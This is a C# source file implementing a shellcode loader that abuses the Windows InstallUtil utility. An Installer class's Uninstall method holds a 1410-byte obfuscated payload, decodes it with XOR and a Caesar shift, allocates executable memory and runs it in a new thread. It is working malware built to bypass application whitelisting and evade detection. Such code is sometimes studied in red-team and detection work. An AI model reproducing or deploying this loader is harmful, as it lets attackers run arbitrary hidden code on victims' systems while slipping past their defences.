using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;

namespace InstallUtil
{
    internal class Program
    {
        static void Main(string[] args)
        {
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId
        );

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );


        static byte[] decryptPayload(byte[] encryptedPayload)
        {
            byte[] data = new byte[encryptedPayload.Length / 2];

            // xor
            for (int i = 0; i < encryptedPayload.Length; i++)
            {
                if (i % 2 == 0)
                    data[i / 2] = (byte)((encryptedPayload[i] ^ 'x'));
            }

            for (int i = 0; i < data.Length; i++)
            {
                data[i] = (byte)((data[i] ^ 'x'));
            }

            // caesar
            for (int i = 0; i < data.Length; i++)
            {
                data[i] = (byte)(((uint)data[i] - 14) & 0xFF);
            }

            return data;
        }


        // functia de dezinstalare pe care o apeleaza installer-ul
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            byte[] payload = new byte[1410] {
0x0a, 0xc9, 0x56, 0xea, 0x91, 0x9e, 0xf2, 0xa2, 0xfe, 0xef, 0xf6, 0x3c, 0xda, 0x52, 0x0e,
0x08, 0x0e, 0xb9, 0x0e, 0x2b, 0x4f, 0xa0, 0x5f, 0x78, 0x4f, 0x5a, 0x5e, 0x93, 0x60, 0x3b,
0x5f, 0x29, 0x64, 0xc4, 0x56, 0x7b, 0x3f, 0x7e, 0xe0, 0x55, 0x73, 0x93, 0x56, 0x80, 0x99,
0xc3, 0x60, 0xbf, 0x6e, 0xf7, 0x56, 0x05, 0x99, 0x7b, 0x60, 0x0d, 0x26, 0xb1, 0x56, 0x69,
0x99, 0xac, 0x60, 0x18, 0x2e, 0xb8, 0x56, 0x7a, 0x99, 0xf5, 0x80, 0x25, 0x5e, 0xa5, 0x56,
0x5f, 0x1d, 0xc5, 0xc5, 0x96, 0x58, 0x00, 0x58, 0xd3, 0x5b, 0x18, 0x3f, 0x0a, 0xd7, 0x49,
0x56, 0x8e, 0x3f, 0x6f, 0xce, 0x2d, 0xba, 0xe6, 0x4a, 0x35, 0x6f, 0xab, 0x8a, 0x75, 0x10,
0xfa, 0x3a, 0x3f, 0x2e, 0x2f, 0x4f, 0xc0, 0xcf, 0xad, 0xd7, 0x66, 0x1b, 0x33, 0x4f, 0x61,
0x0f, 0x39, 0xcf, 0xcb, 0xf0, 0xdd, 0xfb, 0xd7, 0x60, 0x06, 0x4f, 0x00, 0x5f, 0x46, 0x56,
0x58, 0x99, 0x25, 0x60, 0x9d, 0x2e, 0x0b, 0x99, 0xed, 0x50, 0x3d, 0x4a, 0x6f, 0x56, 0xcc,
0x0f, 0x47, 0xde, 0xef, 0x74, 0x31, 0x8f, 0xee, 0x86, 0xef, 0x26, 0x1d, 0x19, 0xd4, 0x10,
0xad, 0x1d, 0x04, 0x93, 0x44, 0x80, 0xbe, 0x0e, 0xa4, 0x0e, 0x01, 0x0e, 0xd1, 0x99, 0xac,
0x8e, 0xfe, 0x96, 0xc7, 0x0e, 0xa2, 0x0e, 0xdb, 0x0e, 0xd5, 0x56, 0xbb, 0x93, 0x7e, 0xce,
0xd7, 0x82, 0x8a, 0x75, 0xc0, 0x56, 0xc0, 0x0f, 0x8e, 0xde, 0x8f, 0x5e, 0xc0, 0x99, 0xa1,
0x56, 0x46, 0x26, 0xbe, 0x52, 0x13, 0x99, 0xea, 0x4e, 0x60, 0x2e, 0x58, 0x57, 0xf4, 0x0f,
0xff, 0xde, 0xcb, 0xf1, 0xcb, 0x64, 0xec, 0x5b, 0xa5, 0x3f, 0x51, 0xd7, 0x0b, 0x56, 0xce,
0x0d, 0xe2, 0xd7, 0xbb, 0x4f, 0x0d, 0x99, 0xff, 0x42, 0x26, 0x96, 0xca, 0x56, 0xc1, 0x0f,
0xd9, 0xe4, 0x10, 0x56, 0x97, 0x3f, 0x40, 0xce, 0x9e, 0xba, 0x2d, 0x4f, 0xa4, 0xcf, 0xa5,
0xd7, 0x16, 0x1b, 0xcb, 0x4f, 0x64, 0x0f, 0xd9, 0xcf, 0x84, 0x46, 0x86, 0xee, 0x08, 0x83,
0x9e, 0xff, 0xe8, 0x5a, 0xcc, 0x11, 0x81, 0x5a, 0x40, 0x32, 0x5e, 0x16, 0x97, 0x53, 0x61,
0x47, 0x9d, 0xdf, 0xa3, 0x83, 0x44, 0xe6, 0x44, 0x66, 0x66, 0x52, 0x8c, 0x99, 0xf8, 0x4e,
0x17, 0x32, 0x22, 0x57, 0x5e, 0x0f, 0xfc, 0xde, 0x5d, 0x74, 0x7b, 0x4f, 0xd9, 0x99, 0xa6,
0x1a, 0x40, 0x56, 0x4e, 0x52, 0xd1, 0x99, 0xad, 0x4e, 0x3c, 0x2a, 0xa7, 0x57, 0xb8, 0x0f,
0xff, 0xde, 0x0d, 0x4f, 0xce, 0x99, 0x51, 0x12, 0xa4, 0x96, 0x9c, 0x4f, 0xaa, 0x66, 0x1b,
0x4f, 0x02, 0x66, 0xeb, 0x6c, 0xc8, 0x56, 0x37, 0x0f, 0x72, 0xde, 0x24, 0x67, 0xd2, 0x68,
0x61, 0x4f, 0xc6, 0x66, 0x90, 0x4f, 0x94, 0x67, 0x3c, 0x4f, 0xb8, 0x68, 0x02, 0x56, 0x00,
0x91, 0xa1, 0xfa, 0x15, 0x2e, 0x3c, 0x4f, 0xc8, 0x60, 0x03, 0x0d, 0xba, 0xee, 0xf5, 0x66,
0x28, 0x4f, 0xd2, 0x67, 0x40, 0x68, 0x5c, 0x56, 0x2c, 0x99, 0xbe, 0x20, 0xfc, 0xf7, 0x8c,
0x59, 0x6f, 0x0d, 0xe3, 0x0d, 0xe3, 0x0d, 0x8e, 0x6b, 0xd3, 0x56, 0x88, 0x3f, 0x0c, 0xe9,
0xca, 0x61, 0xef, 0x57, 0xfa, 0xcc, 0xf5, 0x85, 0x65, 0x77, 0x92, 0x7c, 0x93, 0x77, 0x2f,
0x7c, 0xe3, 0x73, 0x78, 0x82, 0x74, 0x0e, 0x83, 0x4f, 0xa4, 0x64, 0xc2, 0x56, 0xe0, 0x97,
0x4b, 0xef, 0x2f, 0x57, 0xe7, 0xd5, 0x94, 0xd0, 0x3a, 0x5a, 0x7e, 0x85, 0x6e, 0x34, 0x9c,
0x15, 0x7f, 0x0d, 0x9a, 0xe3, 0xeb, 0x61, 0xb0, 0x61, 0xa8, 0x56, 0x29, 0x97, 0xdf, 0xef,
0xb1, 0x61, 0xb6, 0x68, 0xff, 0x5b, 0x1d, 0x3f, 0xc1, 0xce, 0xd3, 0x5b, 0x55, 0x3f, 0x95,
0xd7, 0xdd, 0x61, 0xd9, 0x61, 0x1b, 0x57, 0x2b, 0xc8, 0xe4, 0x48, 0x5c, 0x64, 0x30, 0x87,
0xb2, 0xb5, 0xde, 0x0e, 0x41, 0x0e, 0x06, 0x0e, 0x10, 0x0e, 0x3c, 0x0d, 0x2e, 0xe3, 0xc5,
0xf6, 0xd5, 0x1d, 0x15, 0x0e, 0xe4, 0x0e, 0xca, 0x0e, 0x03, 0x3f, 0xd1, 0x47, 0xf1, 0x40,
0x59, 0x3c, 0x63, 0x3f, 0x7e, 0x44, 0x8b, 0x46, 0x4d, 0x3c, 0x44, 0x42, 0x0b, 0x43, 0x0f,
0x3c, 0x78, 0x3f, 0x93, 0x44, 0x7d, 0x3f, 0x11, 0x0e, 0x81, 0x68, 0x32, 0x56, 0xa5, 0x97,
0xca, 0xcf, 0x00, 0x57, 0xb8, 0xd5, 0xc6, 0xce, 0x60, 0xc9, 0x93, 0x0f, 0xf7, 0x0e, 0x29,
0x0e, 0x9f, 0x5b, 0x1a, 0x3f, 0x0b, 0xd7, 0x69, 0x61, 0xa1, 0x61, 0x8e, 0x78, 0x65, 0x11,
0x8f, 0x61, 0xc9, 0x57, 0x3b, 0xc8, 0x63, 0x65, 0x07, 0x97, 0x30, 0xad, 0x34, 0xd4, 0xd0,
0x0e, 0x95, 0x0e, 0x73, 0x0e, 0x2e, 0x0e, 0x57, 0x0d, 0x41, 0xe3, 0xe9, 0xf6, 0x1a, 0xa5,
0xa2, 0x0e, 0x23, 0x0e, 0x0a, 0x0e, 0xb6, 0x3d, 0xc2, 0x3f, 0x5b, 0x51, 0x89, 0x68, 0xc4,
0x66, 0xe8, 0x76, 0xe4, 0x41, 0xe9, 0x76, 0xb0, 0x5e, 0x65, 0x67, 0xe8, 0x76, 0xb9, 0x6d,
0x53, 0x45, 0xe1, 0x58, 0xf8, 0x5e, 0x9a, 0x7d, 0x8a, 0x7b, 0x2b, 0x7c, 0x5d, 0x51, 0xa5,
0x44, 0xb1, 0x54, 0xed, 0x5a, 0x1d, 0x75, 0xb7, 0x7d, 0xa9, 0x67, 0xca, 0x84, 0xb9, 0x84,
0xc4, 0x5d, 0x2e, 0x73, 0xc7, 0x74, 0xfd, 0x85, 0xfe, 0x63, 0x6f, 0x5d, 0xe5, 0x5a, 0x72,
0x5b, 0x43, 0x45, 0x80, 0x5c, 0x7e, 0x6f, 0x8b, 0x57, 0xc9, 0x41, 0x06, 0x45, 0x95, 0x67,
0x06, 0x67, 0x57, 0x63, 0x6f, 0x83, 0x54, 0x82, 0xa7, 0x6f, 0xc4, 0x5b, 0xd6, 0x5d, 0x2d,
0x5d, 0xe5, 0x86, 0x77, 0x56, 0xcd, 0x78, 0x04, 0x43, 0xd0, 0x3e, 0x40, 0x85, 0x2d, 0x3f,
0x2b, 0x70, 0x67, 0x82, 0x72, 0x81, 0xb6, 0x5f, 0xa6, 0x82, 0x43, 0x84, 0x71, 0x87, 0xef,
0x50, 0x71, 0x76, 0xd1, 0x65, 0xf5, 0x7b, 0xf6, 0x76, 0x3c, 0x61, 0x90, 0x5c, 0x94, 0x47,
0x26, 0x87, 0x0a, 0x64, 0x27, 0x85, 0xa3, 0x85, 0x6e, 0x5a, 0x4d, 0x86, 0xcf, 0x7a, 0xdc,
0x5f, 0xaa, 0x64, 0x7c, 0x55, 0x76, 0x87, 0x78, 0x4f, 0x59, 0x68, 0x0d, 0x77, 0xa8, 0x43,
0xe2, 0x66, 0x8c, 0x61, 0xa8, 0x77, 0x9d, 0x85, 0xdd, 0x5b, 0x9e, 0x59, 0x91, 0x3b, 0x9a,
0x86, 0xe6, 0x53, 0xca, 0x60, 0x0d, 0x7b, 0xef, 0x40, 0x75, 0x76, 0xfa, 0x5a, 0x29, 0x66,
0x56, 0x43, 0x11, 0x74, 0x14, 0x50, 0xc8, 0x7a, 0xc8, 0x3f, 0x3a, 0x3f, 0x65, 0x66, 0xb3,
0x4f, 0x59, 0x43, 0x67, 0x7c, 0xe2, 0x65, 0x01, 0x44, 0x4e, 0x5d, 0xb2, 0x58, 0xa8, 0x3f,
0x43, 0x6d, 0x9e, 0x40, 0x59, 0x84, 0x40, 0x82, 0x76, 0x3b, 0xef, 0x56, 0xc4, 0x78, 0x26,
0x41, 0x3a, 0x6d, 0x7e, 0x76, 0x0b, 0x57, 0xf7, 0x86, 0xc7, 0x7d, 0x50, 0x5a, 0xd8, 0x5d,
0xe4, 0x7b, 0xd2, 0x55, 0x59, 0x85, 0xf8, 0x70, 0xad, 0x7c, 0xdb, 0x6d, 0xea, 0x80, 0x17,
0x6d, 0xbc, 0x41, 0xf6, 0x52, 0x04, 0x60, 0x50, 0x88, 0xd7, 0x52, 0xbd, 0x42, 0x73, 0x7b,
0x14, 0x3e, 0xca, 0x5c, 0x60, 0x44, 0xb5, 0x0e, 0x0f, 0x56, 0xf5, 0x97, 0x0d, 0xcf, 0xac,
0x61, 0x0b, 0x68, 0xc0, 0x4f, 0x08, 0x66, 0x73, 0x5b, 0x52, 0x3f, 0xd2, 0xd7, 0x44, 0x61,
0xca, 0x56, 0x24, 0xc6, 0xda, 0x0e, 0xf8, 0x40, 0xfa, 0xb6, 0x97, 0x92, 0x20, 0x0e, 0xcd,
0x0e, 0x8b, 0x0e, 0x54, 0x0e, 0xdf, 0x5e, 0x0f, 0x61, 0x24, 0x61, 0xd0, 0x57, 0xe9, 0xd5,
0x17, 0xd0, 0x75, 0xf9, 0xef, 0x63, 0x4e, 0x3c, 0xe0, 0x49, 0xc7, 0x0d, 0x0e, 0xe3, 0x89,
0x56, 0xc8, 0x97, 0x6a, 0xd4, 0x5f, 0x78, 0xac, 0x18, 0xd5, 0x6d, 0xbe, 0x56, 0x1c, 0x97,
0xe0, 0xff, 0x1f, 0x78, 0xbc, 0x2d, 0xff, 0x68, 0xa3, 0x60, 0x67, 0x76, 0xfc, 0x8e, 0x56,
0x41, 0x3b, 0x0e, 0x63, 0x0e, 0x6c, 0x57, 0x84, 0x97, 0x5b, 0xee, 0xd8, 0x78, 0xb6, 0x12,
0x6e, 0x4f, 0x61, 0x67, 0x53, 0x57, 0x99, 0xc8, 0x31, 0x83, 0x1b, 0x54, 0x0a, 0xac, 0x8b,
0x94, 0x69, 0x0e, 0x03, 0x0e, 0x43, 0x0e, 0x12, 0x0e, 0x89, 0x0d, 0x15, 0xe3, 0x23, 0x5b,
0x62, 0x3f, 0xd1, 0xce, 0x96, 0x61, 0xf7, 0x68, 0xea, 0x56, 0x47, 0x97, 0xc9, 0xff, 0xac,
0x5b, 0xb4, 0x3f, 0x09, 0xd7, 0x92, 0x5b, 0xa5, 0x3f, 0x2c, 0xd7, 0x62, 0x61, 0xfc, 0x61,
0xba, 0x57, 0x2b, 0xd5, 0x28, 0xd0, 0x99, 0x3b, 0x83, 0x14, 0x75, 0x26, 0xd0, 0x89, 0xb2,
0x0d, 0x04, 0xe3, 0x79, 0x93, 0x5e, 0xce, 0x0b, 0x83, 0xca, 0x2d, 0x73, 0x56, 0xd8, 0xd5,
0xcc, 0xcf, 0xea, 0x96, 0xb8, 0x21, 0x9f, 0x0e, 0x78, 0x0e, 0x11, 0x57, 0x76, 0xc8, 0xeb,
0x52, 0x75, 0xfe, 0xf6, 0x43, 0x1b, 0xee, 0x3b, 0x0e, 0x26, 0x0e, 0x08, 0x0e, 0x26, 0x0e,
0xfc, 0x0d, 0x65, 0xe3, 0xa0, 0x56, 0xf3, 0x0d, 0xc0, 0xdd, 0x9e, 0x82, 0x61, 0x10, 0x77,
0xf9, 0x08, 0xb8, 0x35, 0xf6, 0x09, 0x63, 0xa6, 0x0e, 0x09, 0x0e, 0xf6, 0x0e, 0x14, 0x61,
0xb2, 0x67, 0x86, 0x78, 0xb0, 0x4e, 0x54, 0x68, 0xc3, 0x57, 0x2f, 0x97, 0x65, 0xdf, 0x14,
0xcf, 0x61, 0xf0, 0x63, 0x1e, 0xcc, 0x57, 0xc7, 0xd5, 0x3b, 0xce, 0x2a, 0x0e, 0xef, 0x1e,
0xb1, 0x0e, 0x31, 0x0e, 0x21, 0x57, 0x66, 0xc8, 0x03, 0x66, 0x70, 0xb2, 0xe2, 0x61, 0x5e,
0xf3, 0x2a, 0x0e, 0xc0, 0x0e, 0xe2, 0x0e, 0xfa, 0x0e, 0x37, 0x0d, 0xe2, 0xe3, 0xf6, 0x56,
0xf1, 0xa1, 0xe3, 0x61, 0x7d, 0x61, 0xd8, 0x56, 0xbb, 0x97, 0x1c, 0xf5, 0x02, 0x56, 0x4a,
0x97, 0xcb, 0xff, 0x7e, 0x56, 0x1f, 0x97, 0xc8, 0xe8, 0xc6, 0x57, 0x08, 0xd5, 0x7c, 0xce,
0x5f, 0x0e, 0xad, 0x2e, 0xc4, 0x0e, 0xa0, 0x0e, 0xfa, 0x57, 0x5f, 0x97, 0xfd, 0x07, 0x2a,
0x57, 0x6b, 0xc8, 0x1b, 0x20, 0x48, 0xa4, 0xaf, 0x97, 0x0e, 0xf0, 0x0a, 0x0e, 0x59, 0x0e,
0xac, 0x0e, 0xb4, 0x0e, 0xa9, 0x0d, 0xf2, 0xe3, 0xe8, 0x56, 0x60, 0x91, 0xc1, 0xd2, 0xd9,
0x2e, 0xf5, 0x93, 0x4b, 0xce, 0x36, 0x82, 0x6f, 0xc0, 0xdc, 0x74, 0x6f, 0x99, 0x6b, 0x15,
0x2f, 0x56, 0xa3, 0x0f, 0xcd, 0xd1, 0x35, 0x93, 0xe8, 0xce, 0xbc, 0x83, 0xbc, 0xe0, 0x0e,
0x66, 0x6f, 0xd1, 0x1f, 0x66, 0x7c, 0x78, 0x31, 0x0e, 0x88, 0x67, 0x44, 0x57, 0xea, 0xd5,
0xf4, 0xd0, 0x7b, 0xfe, 0xc6, 0xc3, 0xea, 0xb0, 0x49, 0x64, 0xe2, 0x0d, 0xa6, 0xe3, 0x4c
};

            byte[] decrypted = decryptPayload(payload);

            int size = decrypted.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(decrypted, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
